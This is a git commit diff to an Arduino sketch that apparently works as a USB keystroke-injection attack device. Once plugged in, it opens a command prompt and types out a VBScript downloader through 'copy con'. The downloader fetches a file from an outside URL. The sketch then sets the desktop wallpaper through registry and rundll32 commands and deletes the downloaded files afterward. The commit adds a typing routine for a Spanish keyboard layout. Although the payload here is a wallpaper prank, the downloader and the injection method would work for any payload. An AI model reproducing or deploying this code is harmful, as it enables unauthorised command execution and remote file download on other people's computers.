79eee84a7e6387aff17d052896393ed93ebbe754
Ricardo Ruiz <rjruizfdez@gmail.com>
2018-04-08 18:37:18 +0200

    Add files via upload

--- davidhasselhoff.ino
+++ davidhasselhoff.ino
@@ -12,6 +12,59 @@ void typeKey(int key)
 }
 
 
+void esp_print(String text){
+  for (int i = 0; i<=text.length(); i++)
+  {
+      char val = text[i];
+      if (val == ':'){
+        Keyboard.press(KEY_LEFT_SHIFT);
+        Keyboard.print(".");
+        Keyboard.releaseAll();
+      }
+      else if (val == '/'){
+        Keyboard.press(KEY_LEFT_SHIFT);
+        Keyboard.print("7");
+        Keyboard.releaseAll();
+      }
+      else if (val == '('){
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.print("8");
+          Keyboard.releaseAll();
+      }
+      else if (val == ')'){
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.print("9");
+          Keyboard.releaseAll();
+      }
+      else if (val == '='){
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.print("0");
+          Keyboard.releaseAll();
+      }
+      else if (val == ';'){
+          Keyboard.press(KEY_LEFT_SHIFT);
+          Keyboard.print(",");
+          Keyboard.releaseAll();
+      }
+      else if (val == '"'){
+          Keyboard.press(KEY_LEFT_SHIFT);       
+          Keyboard.print("2");
+          Keyboard.releaseAll();
+      }
+      else if (val == '-'){
+          Keyboard.print("/");
+      }
+      else if (val == '\\'){
+          Keyboard.press(KEY_RIGHT_ALT);       
+          Keyboard.print("`");
+          Keyboard.releaseAll();      
+      }
+      else{
+        Keyboard.print(val);
+      }
+  }
+}
+  
 void opencmd(){
   typeKey(KEY_ESC);
   Keyboard.press(KEY_LEFT_CTRL);
@@ -23,8 +76,8 @@ void opencmd(){
   typeKey(KEY_RETURN);
 }
 
-void changedir(String directory){
-  Keyboard.print("cd ..");
+void changedir(String letter, String directory){
+  Keyboard.print(letter);
   typeKey(KEY_RETURN);
   Keyboard.print("cd ..");
   typeKey(KEY_RETURN);
@@ -38,28 +91,31 @@ void changedir(String directory){
   typeKey(KEY_RETURN);
   Keyboard.print("cd ..");
   typeKey(KEY_RETURN);
-  Keyboard.print("cd "+directory);
+  Keyboard.print("cd ..");
+  typeKey(KEY_RETURN);
+  esp_print("cd "+directory);
   typeKey(KEY_RETURN); 
 }
 
 void createdownlscript(){
   Keyboard.print("copy con download.vbs");
   typeKey(KEY_RETURN);
-  Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
+  // Keyboard.print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
+  esp_print("Set args = WScript.Arguments:a = split(args(0), \"/\")(UBound(split(args(0),\"/\")))");
   typeKey(KEY_RETURN);
-  Keyboard.print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
+  esp_print("Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\"):objXMLHTTP.open \"GET\", args(0), false:objXMLHTTP.send()");
   typeKey(KEY_RETURN);
-  Keyboard.print("If objXMLHTTP.Status = 200 Then");
+  esp_print("If objXMLHTTP.Status = 200 Then");
   typeKey(KEY_RETURN);
-  Keyboard.print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
+  esp_print("Set objADOStream = CreateObject(\"ADODB.Stream\"):objADOStream.Open");
   typeKey(KEY_RETURN);
-  Keyboard.print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
+  esp_print("objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0");
   typeKey(KEY_RETURN);
-  Keyboard.print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
+  esp_print("Set objFSO = Createobject(\"Scripting.FileSystemObject\"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a");
   typeKey(KEY_RETURN);
-  Keyboard.print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
+  esp_print("objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing");
   typeKey(KEY_RETURN);
-  Keyboard.print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
+  esp_print("End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing");
   typeKey(KEY_RETURN);
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press('z');
@@ -83,55 +139,64 @@ void openpowershell(){
   typeKey(KEY_RETURN);
 }
 
-void changewallpaper(){
-  Keyboard.print("Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value \"C:\\Users\\Public\\nl8lz7.jpg\" ");
+void changewallpaper(String letter, String directory, String imagename){
+  esp_print("Set-ItemProperty -path \"HKCU:\\Control Panel\\Desktop\\\" -name wallpaper -value \""+letter+"\\"+directory+"\\"+imagename+"\" ");
   typeKey(KEY_RETURN);
   delay(1000);
-  Keyboard.print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
+  esp_print("rundll32.exe user32.dll, UpdatePerUserSystemParameters 1, True");
   typeKey(KEY_RETURN);
-  delay(1000);
+  delay(250);
 }
 
-/* Init function */
-void setup()
-{
-
+void main_(){
+  String letter = "C:";
+  String directory = "Users\\Public";
   String imagename = "nl8lz7.jpg";
   String url = "http://i65.tinypic.com/nl8lz7.jpg";
   
-  // Begining the Keyboard stream
-  Keyboard.begin();
-  delay(500);
   opencmd();
   delay(100);
-  changedir("Users\\Public");
+  changedir(letter, directory);
   deletedownlscript();
   createdownlscript();
   Keyboard.print("del "+imagename);
   typeKey(KEY_RETURN);
-  Keyboard.print("cscript download.vbs "+url);
+  esp_print("cscript download.vbs "+url);
   typeKey(KEY_RETURN);
   deletedownlscript();
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
+  delay(1000);
   
   openpowershell();
-  delay(2000);
-  changewallpaper();
+  delay(1000);
+  for (int i = 0; i<=7; i++)
+  {
+    changewallpaper(letter, directory, imagename);
+  }
   Keyboard.print("exit");
   typeKey(KEY_RETURN);
   delay(100);  
   
   opencmd();
   delay(100);
-  changedir("Users\\Public");
+  changedir(letter, directory);
   delay(100);
   Keyboard.print("del "+imagename);
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("exit");
-  typeKey(KEY_RETURN);
+  typeKey(KEY_RETURN);    
+}
 
+/* Init function */
+void setup()
+{ 
+  // Begining the Keyboard stream
+  Keyboard.begin();
+  delay(500);
+  
+  main_();   
   Keyboard.end();
 }
 
